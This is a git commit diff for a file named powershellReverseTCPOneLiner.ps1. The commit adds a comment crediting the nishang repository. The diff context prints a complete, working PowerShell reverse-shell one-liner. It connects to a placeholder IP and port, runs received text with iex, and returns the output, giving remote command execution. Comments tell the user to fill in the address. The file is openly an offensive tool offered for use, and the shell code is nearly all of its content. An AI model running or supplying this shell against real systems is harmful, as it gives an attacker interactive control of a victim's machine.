ff0547a23c6f749a982743ae577f088b4d7de1fc
Catchco1 <cag107@gmail.com>
2020-02-02 12:58:18 -0500

    Add credit for shell

--- shells/powershellReverseTCPOneLiner.ps1
+++ shells/powershellReverseTCPOneLiner.ps1
@@ -1,3 +1,4 @@
 #A simple and small reverse shell. Options and help removed to save space. 
 #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+#This oneliner found from https://github.com/samratashok/nishang/tree/master/Shells
 $client = New-Object System.Net.Sockets.TCPClient('<IP ADDRESS>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
